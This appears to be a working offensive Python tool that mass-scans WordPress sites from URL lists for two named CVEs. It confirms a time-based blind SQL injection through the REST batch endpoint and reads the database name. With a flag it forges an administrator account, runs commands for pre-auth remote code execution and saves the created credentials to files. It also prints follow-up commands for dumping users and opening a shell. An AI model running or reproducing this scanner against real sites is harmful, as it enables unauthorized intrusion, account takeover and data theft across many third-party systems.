#!/usr/bin/env python3
"""Confirmed wp2shell mass/single scanner (CVE-2026-63030 + CVE-2026-60137).

Uses Zephr timing detect. For dumps/shell use wp2shell.py — no sqlmap.
"""
from __future__ import print_function

import argparse
import os
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

import zephr_wp2shell as z

try:
    from termcolor import colored
except ImportError:
    def colored(text, _color=None):
        return text

if sys.platform == 'win32':
    try:
        import colorama
        colorama.just_fix_windows_console()
    except ImportError:
        pass

OUTPUT_DIR = os.path.join(BASE_DIR, 'vuln_wp2shell')
VULN_FILE = os.path.join(OUTPUT_DIR, 'wp2shell_vuln.txt')
RCE_FILE = os.path.join(OUTPUT_DIR, 'wp2shell_rce.txt')

_write_lock = threading.RLock()
_print_lock = threading.RLock()
_stats_lock = threading.Lock()
_stats = {'done': 0, 'hits': 0, 'total': 0}
_BLOCK_RE = re.compile(
    r'Internet Positif|Just a moment|cf-browser-verification|Request Rejected|'
    r'Attention Required|Access Denied',
    re.I,
)


def _ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def _append(path, line):
    _ensure_dirs()
    with _write_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line.rstrip() + '\n')


def _log(msg, color=None):
    with _print_lock:
        print(colored(msg, color) if color else msg, flush=True)


def _v(verbose, msg, color=None):
    if verbose:
        _log(msg, color)


def _strip_scheme(url):
    """Return domain/path portion without http:// or https://."""
    if url.startswith('https://'):
        return url[8:]
    if url.startswith('http://'):
        return url[7:]
    return url


def detect_scheme(url, timeout=8):
    """Probe the target with HTTPS first, then HTTP; return the working URL.

    If neither responds, fall back to https:// (default prefer-secure).
    """
    raw = (url or '').strip()
    if not raw:
        return ''
    host = _strip_scheme(raw).rstrip('/')
    # If scheme already present, just validate it works
    if raw.startswith(('http://', 'https://')):
        status, _ = z.http(raw + '/')
        if status is not None:
            return raw.rstrip('/')
        # Try the alternate scheme
        alt = ('https://' if raw.startswith('http://') else 'http://') + host
        status, _ = z.http(alt + '/')
        if status is not None:
            return alt.rstrip('/')
        return raw.rstrip('/')  # keep original as fallback

    # No scheme — probe both; prefer HTTPS
    https_url = 'https://' + host
    http_url = 'http://' + host

    https_ok = False
    http_ok = False
    try:
        s1, _ = z.http(https_url + '/')
        https_ok = s1 is not None
    except Exception:
        pass
    try:
        s2, _ = z.http(http_url + '/')
        http_ok = s2 is not None
    except Exception:
        pass

    if https_ok:
        return https_url
    if http_ok:
        return http_url
    return https_url  # fallback prefer-secure


def ensure_scheme(url):
    url = (url or '').strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def load_urls(path):
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [ensure_scheme(line) for line in f if line.strip()]


def _looks_like_uid(out):
    if not out:
        return False
    s = out.strip()
    if len(s) < 5 or len(s) > 2000:
        return False
    low = s.lower()
    if low.startswith(('<!doctype', '<html', '<')) or '</html>' in low:
        return False
    return bool(re.search(r'uid=\d+\([^\n<]*\)', s))


def _candidates(site, auto_detect=False, timeout=8):
    if auto_detect:
        primary = detect_scheme(site, timeout=timeout)
        out = [primary]
        if primary.startswith('http://'):
            out.append('https://' + primary[7:])
        elif primary.startswith('https://'):
            out.append('http://' + primary[8:])
        return out
    site = ensure_scheme(site)
    out = [site]
    if site.startswith('http://'):
        out.append('https://' + site[7:])
    elif site.startswith('https://'):
        out.append('http://' + site[8:])
    return out


def _batch_open(base):
    status, body = z.http(base + '/?rest_route=/batch/v1', 'POST', b'{}')
    if status is None:
        status, body = z.http(base + '/wp-json/batch/v1', 'POST', b'{}')
    if body and _BLOCK_RE.search(body[:4000]):
        return False, 'blocked'
    if not body:
        return False, 'batch unreachable'
    if 'rest_missing_callback_param' in body or 'rest_invalid_param' in body:
        return True, 'batch open'
    return False, 'batch closed'


def _check_one(site, timeout, sleep, rounds, do_rce, verbose=False):
    z.TIMEOUT = int(timeout)
    z.DEFAULT_TIMEOUT = int(timeout)

    _v(verbose, '[1/5] fetching homepage ...')
    status, body = z.http(site + '/')
    if status is None:
        _v(verbose, '[-] unreachable', 'yellow')
        return False, 'unreachable'
    if body and _BLOCK_RE.search(body[:4000]):
        _v(verbose, '[-] blocked (WAF/ISP/challenge)', 'yellow')
        return False, 'blocked (WAF/ISP/challenge)'
    _v(verbose, '[+] homepage HTTP %s' % status, 'cyan')

    ver = None
    m = re.search(r'name="generator" content="WordPress ([^"]+)"', body or '')
    if m:
        ver = m.group(1).strip()
        _v(verbose, '[*] WordPress version: %s' % ver, 'cyan')
    else:
        _v(verbose, '[*] WordPress version: unknown', 'cyan')

    _v(verbose, '[2/5] probing REST batch endpoint ...')
    open_ok, open_reason = _batch_open(site)
    if not open_ok:
        _v(verbose, '[-] batch: %s' % open_reason, 'yellow')
        return False, open_reason
    _v(verbose, '[+] batch open (%s)' % open_reason, 'cyan')

    det_timeout = max(float(timeout), float(sleep) * 40.0, 180.0)
    _v(
        verbose,
        '[3/5] timing SQLi detect (sleep=%.1fs rounds=%d timeout=%.0fs) ...'
        % (sleep, rounds, det_timeout),
    )
    _v(verbose, '    (waiting on SLEEP probes — may take 1-3+ minutes)', 'cyan')
    eng = z.PreAuthRCE(site, timeout=det_timeout, sleep=sleep, route='auto')
    try:
        det = eng.detect(rounds=rounds)
    except Exception as e:
        _v(verbose, '[-] detect error: %s' % e, 'yellow')
        return False, 'detect error: %s' % e

    _v(
        verbose,
        '[*] timing fast=%.2fs slow=%.2fs delta=%.2fs'
        % (det.get('fast', 0), det.get('slow', 0), det.get('delta', 0)),
        'cyan',
    )
    if not det.get('vulnerable'):
        _v(verbose, '[-] timing not confirmed', 'yellow')
        return False, 'timing not confirmed (fast=%.2fs slow=%.2fs delta=%.2fs)' % (
            det.get('fast', 0), det.get('slow', 0), det.get('delta', 0),
        )
    _v(verbose, '[+] timing SQLi confirmed', 'green')

    proof = 'delta=%.2fs' % det.get('delta', 0)
    _v(verbose, '[4/5] reading DATABASE() via blind SQLi ...')
    try:
        eng.timeout = max(eng.timeout, 60.0)
        db = eng.read_scalar(
            'DATABASE()',
            maxlen=64,
            unit=max(0.8, min(1.5, sleep * 0.35)),
        )
        if db and re.fullmatch(r'[A-Za-z0-9_$]+', db):
            proof = db
            _v(verbose, '[+] DATABASE()=%s' % db, 'green')
        else:
            _v(verbose, '[*] DATABASE() unreadable/garbage; keeping timing proof', 'yellow')
    except Exception as e:
        _v(verbose, '[*] DATABASE() skipped: %s' % e, 'yellow')

    hit = '%s [wp2shell] sqli=timing proof=%s ver=%s' % (site, proof[:120], ver or '-')
    _log('[+] CONFIRMED %s | %s | ver=%s' % (site, proof[:120], ver or '-'), 'green')
    _append(VULN_FILE, hit)
    _v(verbose, '[*] next: python3 wp2shell.py read %s --preset users' % site, 'cyan')
    _v(verbose, '[*] next: python3 wp2shell.py shell %s -i' % site, 'cyan')

    if not do_rce:
        return True, 'ok'

    _v(verbose, '[5/5] attempting pre-auth RCE / admin forge ...')
    try:
        user, pw, run, cleanup = eng.deploy()
        _log('[+] ADMIN OK %s | user=%s | pass=%s' % (site, user, pw), 'green')
        _append(RCE_FILE, '%s [wp2shell-admin] user=%s pass=%s' % (site, user, pw))
        out = run('id')
        ok = _looks_like_uid(out or '')
        try:
            cleanup()
        except Exception:
            pass
        if ok:
            _log('[+] RCE %s | %s' % (site, (out or '')[:160]), 'green')
            _append(
                RCE_FILE,
                '%s [wp2shell-rce] user=%s pass=%s out=%s'
                % (site, user, pw, (out or '')[:200]),
            )
            _append(
                VULN_FILE,
                '%s [wp2shell-rce] user=%s pass=%s out=%s'
                % (site, user, pw, (out or '')[:120]),
            )
            return True, 'ok'
        _log('[-] ADMIN created but id() not confirmed: %s' % site, 'yellow')
        return True, 'sqli+admin ok, rce id not confirmed'
    except Exception as e:
        _log('[-] RCE failed (SQLi still confirmed): %s' % e, 'yellow')
        return True, 'sqli ok, rce failed: %s' % e


def check_wp2shell(site, timeout=30.0, sleep=4.0, rounds=3, do_rce=False, verbose=False, auto_detect=False):
    last = 'miss'
    cands = _candidates(site, auto_detect=auto_detect, timeout=min(timeout, 8))
    for i, url in enumerate(cands, 1):
        if verbose and len(cands) > 1:
            _log('[*] candidate %d/%d: %s' % (i, len(cands), url), 'cyan')
        ok, reason = _check_one(url, timeout, sleep, rounds, do_rce, verbose=verbose)
        if ok:
            return True, reason
        last = reason
        if verbose and i < len(cands):
            _log('[*] trying alternate scheme ...', 'cyan')
    return False, last


def _progress_tick(url, hit, quiet, reason=''):
    with _stats_lock:
        _stats['done'] += 1
        _stats['hits'] += 1 if hit else 0
        done = _stats['done']
        total = _stats['total']
        hits = _stats['hits']
    if quiet:
        return
    if hit:
        _log('[%d/%d] %s -> %s' % (done, total, url, colored('HIT', 'green')))
    else:
        extra = ' (%s)' % reason if reason else ''
        _log('[%d/%d] %s -> %s%s' % (done, total, url, colored('miss', 'red'), extra))
    if done == total or done % 100 == 0:
        pct = 100.0 * done / total if total else 0
        _log('[*] Progress: %d/%d (%.1f%%) | hits: %d' % (done, total, pct, hits), 'cyan')


def process_site(site, timeout, sleep, rounds, do_rce, quiet, verbose, auto_detect=False):
    if not site:
        return
    if not quiet:
        _log('[>] %s' % site)
    hit = False
    reason = ''
    try:
        hit, reason = check_wp2shell(
            site,
            timeout=timeout,
            sleep=sleep,
            rounds=rounds,
            do_rce=do_rce,
            verbose=verbose,
            auto_detect=auto_detect,
        )
    except Exception as e:
        reason = str(e)
        if verbose:
            _log('[-] error: %s' % e, 'red')
    _progress_tick(site, hit, quiet, reason)


def run_scan(urls, threads, timeout, sleep, rounds, do_rce, quiet, force_verbose=False, auto_detect=False):
    _ensure_dirs()
    with _stats_lock:
        _stats['done'] = 0
        _stats['hits'] = 0
        _stats['total'] = len(urls)
    step_verbose = (not quiet) and (force_verbose or len(urls) == 1)
    mode = ' | RCE' if do_rce else ''
    verb = ' | verbose' if step_verbose else ''
    detect_tag = ' | auto-detect' if auto_detect else ''
    _log('[*] Scanning %d URL(s) | threads=%d%s%s%s' % (len(urls), threads, mode, verb, detect_tag), 'cyan')
    _log('[*] Output: %s' % OUTPUT_DIR, 'cyan')
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [
            pool.submit(
                process_site, u, timeout, sleep, rounds, do_rce, quiet, step_verbose, auto_detect,
            )
            for u in urls
        ]
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception:
                pass
    with _stats_lock:
        done, hits = _stats['done'], _stats['hits']
    _log('[*] Done. %d scanned, %d confirmed.' % (done, hits), 'cyan')
    return 0


def print_banner():
    _log('=' * 50, 'cyan')
    _log('  CVE-2026-63030 + CVE-2026-60137 wp2shell', 'green')
    _log('=' * 50, 'cyan')


def main():
    print_banner()
    ap = argparse.ArgumentParser(description='WordPress wp2shell confirmed scanner')
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument('-l', '--list', dest='list_file', help='URL list file (one per line)')
    src.add_argument('-u', '--url', dest='single_url', help='Single target URL/domain')
    ap.add_argument('-t', '--threads', type=int, default=10, help='Thread workers (default 10)')
    ap.add_argument('--timeout', type=float, default=40.0, help='HTTP timeout (default 40)')
    ap.add_argument('--sleep', type=float, default=5.0, help='SQLi timing SLEEP seconds (default 5)')
    ap.add_argument('--rounds', type=int, default=3, help='Timing probe rounds (default 3)')
    ap.add_argument('--rce', action='store_true', help='Attempt pre-auth RCE after SQLi confirm')
    ap.add_argument('-q', '--quiet', action='store_true', help='Quiet: hits + summary only')
    ap.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Step logs for every URL (auto-on for single -u)',
    )
    ap.add_argument(
        '-D', '--auto-detect',
        action='store_true',
        help='Auto-detect HTTP/HTTPS scheme for each target before scanning',
    )
    args = ap.parse_args()

    if args.single_url:
        url = ensure_scheme(args.single_url)
        if not url:
            _log('[-] Empty URL.', 'red')
            return 1
        urls = [url]
    else:
        if not args.list_file or not os.path.isfile(args.list_file):
            _log('[-] List file not found: %s' % args.list_file, 'red')
            return 1
        urls = load_urls(args.list_file)
        if not urls:
            _log('[-] URL list is empty.', 'red')
            return 1

    return run_scan(
        urls,
        max(1, min(args.threads, 100)),
        args.timeout,
        args.sleep,
        max(1, args.rounds),
        args.rce,
        args.quiet,
        force_verbose=args.verbose,
        auto_detect=args.auto_detect,
    )


if __name__ == '__main__':
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        print(colored('\n[!] Interrupted.', 'yellow'))
        sys.exit(130)
